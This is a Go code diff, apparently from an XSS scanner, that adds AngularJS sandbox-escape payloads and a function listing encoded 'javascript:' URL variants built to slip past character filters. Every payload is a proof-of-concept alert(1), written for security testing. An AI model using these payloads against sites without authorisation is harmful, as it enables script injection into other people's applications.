@@ -63,6 +63,13 @@ var Polyglots = map[models.ReflectionContext][]string{
 		// Close comment and inject script
 		"--><script>alert(1)</script>",
 	},
+	models.ContextAngular: {
+		// AngularJS sandbox escape payloads
+		"{{constructor.constructor('alert(1)')()}}",
+		"{{[].pop.constructor('alert(1)')()}}",
+		"{{$on.constructor('alert(1)')()}}",
+		"{{a='alert';b='(1)';constructor.constructor(a+b)()}}",
+	},
 }
 
 // GetPolyglot returns a suggested polyglot based on the context.
@@ -76,4 +83,21 @@ func GetPolyglot(context models.ReflectionContext) string {
 	}
 
 	return defaultPolyglot
+}
+
+// GetJavaScriptURLVariants returns various encoding variants of javascript: URLs
+// Useful when certain characters are blocked in URL contexts
+func GetJavaScriptURLVariants() []string {
+	return []string{
+		"javascript:alert(1)",
+		"javascript:alert%281%29",           // URL encoded parens
+		"javascript:alert\\x281\\x29",       // Hex encoded parens
+		"javascript:alert\\u00281\\u0029",   // Unicode encoded parens
+		"javascript:alert`1`",               // Template literals
+		"javascript://comment%0aalert(1)",   // Newline bypass
+		"javascript:void(alert(1))",         // void wrapper
+		"javascript:window.alert(1)",        // window prefix
+		"javascript:eval('alert(1)')",       // eval wrapper
+		"javascript:setTimeout('alert(1)')", // setTimeout wrapper
+	}
 }
